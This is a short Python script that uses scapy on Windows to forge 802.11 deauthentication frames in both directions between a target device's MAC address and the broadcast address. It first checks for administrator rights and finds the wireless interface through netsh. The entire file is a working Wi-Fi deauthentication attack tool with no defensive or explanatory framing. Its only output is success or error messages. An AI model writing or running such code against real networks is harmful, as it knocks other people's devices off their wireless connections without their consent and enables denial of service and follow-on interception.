from scapy.all import *
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
import ctypes
import subprocess

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def get_interface_name():
    try:
        # Get wireless interfaces using netsh
        output = subprocess.check_output('netsh wlan show interfaces', shell=True).decode()
        # Extract interface name
        for line in output.split('\n'):
            if 'Name' in line:
                return line.split(':')[1].strip()
    except:
        return None

def deauth_device(mac_address, interface=None, count=3):
    if not is_admin():
        return "ERROR: Must run as administrator"
    
    try:
        if not interface or interface == "wlan0":
            interface = get_interface_name()
            if not interface:
                return "ERROR: No wireless interface found"

        # Convert MAC address format
        target = mac_address.replace('-', ':')
        
        # Get AP MAC address (BSSID)
        ap_mac = "FF:FF:FF:FF:FF:FF"  # Broadcast address for all APs
        
        # Create deauth packets for both directions
        # Client to AP
        pkt1 = RadioTap()/Dot11(
            type=0, subtype=12,  # type=management, subtype=deauth
            addr1=ap_mac,        # destination (AP)
            addr2=target,        # source (client)
            addr3=ap_mac         # BSSID
        )/Dot11Deauth(reason=7)  # reason 7 = Class 3 frame received from nonassociated STA
        
        # AP to Client
        pkt2 = RadioTap()/Dot11(
            type=0, subtype=12,
            addr1=target,        # destination (client)
            addr2=ap_mac,        # source (AP)
            addr3=ap_mac         # BSSID
        )/Dot11Deauth(reason=7)

        # Send packets
        for i in range(count):
            sendp(pkt1, iface=interface, verbose=0)
            sendp(pkt2, iface=interface, verbose=0)
            time.sleep(0.1)  # Small delay between packets
            
        return f"SUCCESS: Sent {count*2} deauth packets to {mac_address}"
    except Exception as e:
        return f"ERROR: {str(e)}"